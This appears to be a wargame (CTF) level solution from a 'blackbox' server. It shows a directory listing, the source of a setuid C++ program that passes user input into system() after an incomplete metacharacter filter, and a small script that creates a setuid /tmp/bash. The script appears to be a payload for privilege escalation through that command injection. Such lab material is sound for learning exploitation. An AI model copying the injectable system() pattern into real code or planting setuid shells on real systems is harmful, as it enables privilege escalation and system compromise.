level3@blackbox:/tmp/level3$ ls -al
total 1200
drwxr-xr-x   2 level3 gamers    4096 Dec  5 03:38 .
drwx-wx-wt 175 root   root     16384 Dec  5 03:30 ..
-rwxr-xr-x   1 level3 gamers      59 Dec  5 03:30 PID
-rw-r--r--   1 level3 gamers      12 Dec  5 03:30 password
-rwxr-xr-x   1 level3 gamers 1189178 Dec  5 03:30 proclist
-rw-r--r--   1 level3 gamers     490 Dec  5 03:30 proclist.cc
level3@blackbox:/tmp/level3$ 

/* PID */

#!/bin/bash
/bin/touch /tmp/bash
/bin/chmod +sx /tmp/bash

/* proclist.cc */
#include <iostream>
#include <string>

int main(int main, char **argv)
{
        std::string command;
        std::string program;

        std::cout << "Enter the name of the program: ";
        std::cin >> program;

        for(unsigned int i = 0; i < program.length(); i++) {
                if(strchr(";^&|><", program[i]) != NULL) {
                        std::cout << "Fatal error" << std::endl;
                        return 1;
                }
        }


        // Execute the command to list the programs
        command = "/bin/ps |grep ";
        command += program;
        system(command.c_str());

        return 0;
}